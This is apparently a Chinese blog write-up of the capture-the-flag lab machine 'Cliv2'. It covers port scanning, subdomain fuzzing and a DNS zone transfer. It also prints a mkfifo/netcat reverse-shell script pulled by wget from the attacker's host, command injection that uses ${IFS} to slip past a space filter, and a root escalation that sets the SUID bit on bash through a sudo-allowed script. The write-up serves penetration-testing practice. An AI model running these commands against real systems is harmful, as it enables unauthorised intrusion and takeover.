{"pageProps":{"postData":{"id":"群U靶机 - Cliv2","contentHtml":"<h1>群U靶机 - Cliv2</h1>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-scheme\">➜  Test nmap -sT -min-rate 10000 -p- 192.168.56.100\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:37 CST\nNmap scan report for 192.168.56.100\nHost is up (0.00018s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp open  domain\n80/tcp open  http\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-scheme\">\n➜  Test nmap -sT -A -p 22,80,53 192.168.56.100     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:38 CST\nNmap scan report for cliv2.dsz (192.168.56.100)\nHost is up (0.00042s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.16.50-Debian\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: CLIv2 Main\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms cliv2.dsz (192.168.56.100)\n</code></pre>\n<p>子域名爆破</p>\n<pre><code class=\"hljs language-scheme\">➜  Test ffuf -u 'http://cliv2.dsz/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'host: FUZZ.cliv2.dsz' --fs=3669\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://cliv2.dsz/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.cliv2.dsz\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 3669\n________________________________________________\n\nclient                  [Status: 200, Size: 873, Words: 147, Lines: 42, Duration: 0ms]\ndev                     [Status: 200, Size: 654, Words: 113, Lines: 34, Duration: 315ms]\n</code></pre>\n<h2>DNS 区域传输漏洞</h2>\n<p>看到 <code>dev</code> 就很兴奋</p>\n<p>点进去后看到 <strong><code>AXFR</code></strong></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA%20-%20Cliv2/image.png\" alt=\"image.png\"></p>\n<p>我一搜，能找到：</p>\n<blockquote>\n<p><strong>DNS 区域传输 (<code>AXFR</code>)</strong></p>\n<p>使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信息并使用 AXFR 将信息复制到其他服务器。但是，如果您不保护您的服务器，恶意方可能会使用 AXFR 来获取有关您所有主机的信息。</p>\n</blockquote>\n<p>那么它肯定没有保护</p>\n<pre><code class=\"hljs language-scheme\">➜  Test dig axfr @192.168.56.100  cliv2.dsz \n\n; &#x3C;&#x3C;>> DiG 9.20.9-1-Debian &#x3C;&#x3C;>> axfr @192.168.56.100 cliv2.dsz\n; (1 server found)\n;; global options: +cmd\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\ncliv2.dsz.              86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      NS      ns1.dsz.\n3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1\nclient.cliv2.dsz.       86400   IN      A       127.0.0.1\ndev.cliv2.dsz.          86400   IN      A       127.0.0.1\nns1.cliv2.dsz.          86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\n;; Query time: 0 msec\n;; SERVER: 192.168.56.100#53(192.168.56.100) (TCP)\n;; WHEN: Thu Jul 31 18:58:51 CST 2025\n;; XFR size: 8 records (messages 1, bytes 264)\n</code></pre>\n<h2>反弹 shell</h2>\n<p>有命令执行功能</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA%20-%20Cliv2/image1.png\" alt=\"image.png\"></p>\n<p>不能有空格限制：不允许使用空格或连字符。最大长度：64 个字符。</p>\n<p>在 <code>Kali</code> 准备恶意文件，并开启 <code>HTTP</code> 服务器</p>\n<pre><code class=\"hljs language-scheme\">➜  Test cat v.sh \n#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|busybox nc 192.168.56.5 1234 >/tmp/f\n</code></pre>\n<p>通过两步来拿到 <code>shell</code></p>\n<pre><code class=\"hljs language-scheme\">cmd=cd${IFS}/tmp;busybox${IFS}wget${IFS}192.168.56.5/v.sh;ls${IFS}/tmp\ncmd=cd${IFS}/tmp;chmod${IFS}777${IFS}v.sh;./v.sh\n</code></pre>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA%20-%20Cliv2/image2.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<p><code>Linpeas.sh</code> 发现 <code>bitc0de</code> 家目录中有一个 <code>…</code></p>\n<pre><code class=\"hljs language-scheme\">╔══════════╣ Searching root files in home dirs (limit 30)\n/home/\n/home/bitc0de/.bash_history\n/home/bitc0de/...\n/home/bitc0de/user.txt\n/root/\n/var/www\n/var/www/html\n/var/www/html/index.html\n/var/www/cliv2.dsz\n/var/www/cliv2.dsz/index.php\n/var/www/3170a7.cliv2.dsz\n/var/www/3170a7.cliv2.dsz/index.php\n/var/www/client.cliv2.dsz\n/var/www/client.cliv2.dsz/index.php\n/var/www/dev.cliv2.dsz\n/var/www/dev.cliv2.dsz/index.php\n</code></pre>\n<p>读取拿到密码</p>\n<pre><code class=\"hljs language-scheme\">www-data@Cliv2:/home/bitc0de$ cat ...\nMabEwReOmcpG!123\n</code></pre>\n<p>切换到 <code>bitc0de</code> 并查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-scheme\">\nbitc0de@Cliv2:~$ sudo -l\nMatching Defaults entries for bitc0de on Cliv2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser bitc0de may run the following commands on Cliv2:\n    (ALL) NOPASSWD: /usr/local/bin/hmvcli\n</code></pre>\n<p><code>hmvcli</code>是通过<code>python</code>写的</p>\n<p>分析后发现其中有一部分代码有问题，只要参数是<code>config</code> 就会运行 <code>setup.sh</code></p>\n<pre><code class=\"hljs language-scheme\">if args['config']:                              \n    print(\"[*] Ejecutando script de configuración...\")\n    subprocess.run([\"bash\", \"setup.sh\"])  \n    sys.exit(0) \n</code></pre>\n<p>梭哈</p>\n<pre><code class=\"hljs language-scheme\">echo \"chmod +s /bin/bash\" > setup.sh\nchmod +x setup.sh\nsudo hmvcli --config\n</code></pre>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA%20-%20Cliv2/image3.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>Q裙：660930334</p>","title":"群U靶机 - Cliv2","date":"2025-07-31","updated":"2025-07-31","tags":["群U","Linux","DNS","hvmcli"],"categories":"靶机","comments":true,"description":"群U靶机 - Cliv2\n\nRecon\n\n端口扫描\n\n\n\n\n\n子域名爆破\n\n\n\nDNS 区域传输漏洞\n\n看到 `dev` 就很兴奋\n\n点进去后看到 `AXFR`\n\n\n\n我一搜，能找到：\n\n DNS 区域传输 (`AXFR`)\n \n \n 使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信..."},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}